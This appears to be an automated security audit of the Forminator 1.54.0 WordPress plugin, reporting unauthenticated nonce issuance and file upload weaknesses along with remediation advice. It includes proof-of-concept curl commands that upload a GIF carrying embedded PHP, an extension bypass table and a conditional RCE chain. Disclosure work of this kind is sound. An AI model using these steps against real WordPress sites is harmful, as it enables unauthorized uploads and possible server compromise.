# Forminator Unauthenticated File Upload Security Audit

**Plugin:** Forminator 1.54.0
**Date:** 2026-06-14
**Auditor:** Automated Security Audit

---

## Executive Summary

Forminator's `wp_ajax_nopriv_forminator_multiple_file_upload` handler is accessible to unauthenticated users. While a nonce check exists, the nonce is freely obtainable unauthenticated via `forminator_get_nonce`. Direct PHP file upload is blocked by WordPress core's MIME type whitelist and Forminator's extension blacklist. **No exploitable unauthenticated RCE was confirmed on a default Apache installation**, but several design weaknesses were identified that could lead to exploitation in specific server configurations.

**Overall RCE Verdict: NOT directly exploitable on default Apache. Conditionally exploitable on misconfigured Nginx/alternative servers.**

---

## Finding 1: Unauthenticated Nonce Generation (HIGH)

**Endpoint:** `wp_ajax_nopriv_forminator_get_nonce`
**File:** `library/abstracts/abstract-class-front-action.php:1207-1210`

```php
public function get_nonce() {
    $form_id = filter_input( INPUT_POST, 'form_id', FILTER_VALIDATE_INT );
    wp_send_json_success( wp_create_nonce( 'forminator_submit_form' . $form_id ) );
}
```

Any unauthenticated user can obtain a valid nonce for any form ID with no rate limiting, no CAPTCHA, no authentication. This effectively nullifies all nonce-based protections on other handlers for automated attacks.

### PoC

```bash
# Get nonce for any form (e.g., form_id=32)
curl -s -X POST http://localhost:8880/wp-admin/admin-ajax.php \
  -d "action=forminator_get_nonce&form_id=32"
# Response: {"success":true,"data":"5ad2fdad0e"}
```

**Impact:** Enables automated spam submissions, file upload abuse, and bypasses CSRF protection on all form-related endpoints.

---

## Finding 2: Unauthenticated File Upload with PHP Content (MEDIUM)

**Endpoint:** `wp_ajax_nopriv_forminator_multiple_file_upload`
**File:** `library/modules/custom-forms/front/front-action.php:1867-1890`

An unauthenticated attacker can upload files with arbitrary content (including PHP code) as long as the file extension is in WordPress's allowed MIME types (e.g., `.gif`, `.jpg`, `.png`, `.pdf`, `.doc`).

### PoC - Upload GIF with PHP payload

```bash
# Step 1: Get nonce
NONCE=$(curl -s -X POST http://localhost:8880/wp-admin/admin-ajax.php \
  -d "action=forminator_get_nonce&form_id=32" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['data'])")

# Step 2: Upload GIF with PHP content
echo 'GIF89a<?php phpinfo(); ?>' > /tmp/shell.gif
curl -s -X POST http://localhost:8880/wp-admin/admin-ajax.php \
  -F "action=forminator_multiple_file_upload" \
  -F "form_id=32" \
  -F "nonce=$NONCE" \
  -F "element_id=upload-1" \
  -F "upload-1=@/tmp/shell.gif"
```

**Response (confirmed):**
```json
{
  "success": true,
  "data": {
    "success": true,
    "file_name": "gug2P9dDWBcf-test_rce.gif",
    "file_url": "http://localhost:8880/wp-content/uploads/forminator/32_.../uploads/gug2P9dDWBcf-test_rce.gif",
    "file_path": "/var/www/html/wp-content/uploads/forminator/temp/gug2P9dDWBcf-test_rce.gif"
  }
}
```

**Why it doesn't lead to RCE on default Apache:**
- File served with `Content-Type: image/gif` (verified: `Content-Type: image/gif`)
- `.htaccess` in upload root directory disables PHP execution: `SetHandler none`, `Options -ExecCGI`, `RemoveHandler .php ...`
- File extension is `.gif`, not `.php`, so Apache won't pass it to PHP

**Risk escalation scenarios:**
- Nginx server (no `.htaccess` support) + misconfigured PHP-FPM pass-through
- Combined with Local File Inclusion (LFI) vulnerability in any plugin
- `.htaccess` protection uses `mod_php5.c` conditional -- modern servers using `mod_php.c` or `php-fpm` skip the `php_flag engine off` directive

---

## Finding 3: .htaccess Protection Gaps (MEDIUM)

**File:** `library/abstracts/abstract-class-field.php:2365-2396`

The `.htaccess` protection has several weaknesses:

1. **Outdated module reference:** Uses `<IfModule mod_php5.c>` but modern PHP uses `mod_php.c` or php-fpm, meaning `php_flag engine off` doesn't apply on PHP 7/8.

2. **Incomplete RemoveHandler:** Only removes: `.cgi .php .php3 .php4 .php5 .phtml .pl .py .pyc .pyo`. Missing: `.phar`, `.php7`, `.php8`, `.pht`, `.shtml`.

3. **Nginx irrelevance:** `.htaccess` files have no effect on Nginx servers.

4. **Filterable rules:** `apply_filters('forminator_upload_root_htaccess_rules', $rules)` allows other plugins/themes to weaken or remove protection.

```
# Current .htaccess content:
<Files *>
  SetHandler none
  SetHandler default-handler
  Options -ExecCGI
  Options -Indexes
  RemoveHandler .cgi .php .php3 .php4 .php5 .phtml .pl .py .pyc .pyo
</Files>
<IfModule mod_php5.c>
  php_flag engine off
</IfModule>
```

---

## Finding 4: Blacklist Key Format Mismatch (LOW - Latent Bug)

**File:** `library/helpers/helper-fields.php:3384-3388`

The blacklist filtering logic has a format mismatch that renders it ineffective as a safety net:

```php
$filters = array('htm|html', 'js', 'jse', 'jar', 'php', ...);
foreach ( array_keys( $mimes ) as $mime_key ) {
    $key = strtolower( $mime_key );
    if ( in_array( $key, $filters, true ) ) {
        unset( $mimes[ $mime_key ] );
    }
}
```

WordPress MIME type keys use compound format like `'jpg|jpeg|jpe'`. The blacklist has entries like `'htm|html'` (matches WP format) AND plain entries like `'php'` (would NOT match WP compound keys like `'php|phps'` if they existed). Currently not exploitable because PHP extensions aren't in WordPress's default allowed MIME types.

---

## Finding 5: File Path Disclosure in Upload Response (LOW)

The upload response returns the full server path:
```json
"file_path": "/var/www/html/wp-content/uploads/forminator/temp/gug2P9dDWBcf-test_rce.gif"
```

This reveals the server's document root path to unauthenticated users, which aids further exploitation.

---

## Finding 6: Filename Predictability Mitigated

Filenames are randomized with `wp_generate_password(12, false, false)`, making direct URL guessing infeasible. However, the URL is returned in the upload response, eliminating the need to guess.

---

## Extension Test Results (Confirmed)

| Extension | Upload Result | Reason |
|-----------|--------------|--------|
| `.php` | BLOCKED | Not in WP allowed MIME types |
| `.phtml` | BLOCKED | Not in WP allowed MIME types |
| `.phar` | BLOCKED | Not in WP allowed MIME types |
| `.php7` | BLOCKED | Not in WP allowed MIME types |
| `.php8` | BLOCKED | Not in WP allowed MIME types |
| `.pht` | BLOCKED | Not in WP allowed MIME types |
| `.cgi` | BLOCKED | Not in WP allowed MIME types |
| `.svg` | BLOCKED | In Forminator blacklist |
| `.html` | BLOCKED | In Forminator blacklist |
| `.htaccess` | BLOCKED | Not in WP allowed MIME types |
| `.gif` (with PHP content) | **UPLOADED** | Extension in allowed MIME types |
| `.php.jpg` | **UPLOADED** (as `.php_.jpg`) | `sanitize_file_name` converts `.` to `_` |

---

## Other Nopriv Handler Audit

### `forminator_pp_create_order` (PayPal Order Creation)
- **File:** `front-action.php:163-222`
- Nonce check present (but nonce freely obtainable)
- User-controlled `form_data` passed to PayPal SDK with minimal sanitization
- **Risk:** PayPal order manipulation (not RCE)

### `forminator_update_payment_amount`
- **File:** `front-action.php:230-279`
- Nonce check present
- Amount recalculated server-side from form pricing rules
- **Risk:** Low - server-side validation prevents direct amount manipulation

### `forminator_email_draft_link`
- **File:** `front-action.php:3171-3245`
- Nonce check present (different nonce format: `forminator_nonce_email_draft_link_` + draft_id)
- `form_id` from POST not verified against `draft_id`'s actual form
- **Risk:** Low - could send emails using wrong form's template

### `save_entry` / `save_entry_preview`
- Nonce validated via `validate_ajax()` which has a conditional bypass when `FORMINATOR_FORCE_VALIDATE_SUBMISSIONS_NONCE = false`
- The bypass compares `$original_action` (e.g., `forminator_submit_form32`) with `$request_action` (e.g., `forminator_submit_form_custom-forms`) -- these will NEVER match, so the bypass is not exploitable even when the constant is disabled
- **Risk:** None beyond what `get_nonce` already enables

---

## Attack Chain Analysis

### Theoretical RCE Chain (NOT confirmed exploitable)

1. Attacker gets nonce: `POST action=forminator_get_nonce&form_id=<any>`
2. Attacker uploads PHP-in-GIF: `POST action=forminator_multiple_file_upload` with `.gif` extension
3. Response reveals exact file URL and path
4. **BLOCKED HERE on default Apache** -- `.htaccess` prevents PHP execution
5. On Nginx without equivalent protection, the file could theoretically be included via an LFI

### What would be needed for RCE:
- Nginx server without PHP execution protection in uploads directory, OR
- Another plugin with Local File Inclusion (LFI) vulnerability, OR
- `mod_php5.c` module check bypassed (modern PHP installations), AND
- Apache configured to parse PHP in directories despite `SetHandler none`

---

## Recommendations

1. **Critical:** Remove or restrict `forminator_get_nonce` nopriv handler -- add rate limiting, CAPTCHA, or require authentication
2. **High:** Update `.htaccess` to use `mod_php.c` in addition to `mod_php5.c`
3. **High:** Add MIME content validation that rejects files with PHP code signatures regardless of extension (defense in depth)
4. **Medium:** Remove server file path from upload response (information disclosure)
5. **Medium:** Fix blacklist key format to use individual extension matching instead of relying on compound key matching
6. **Low:** Add `.phar`, `.php7`, `.php8`, `.pht` to the `RemoveHandler` directive in `.htaccess`
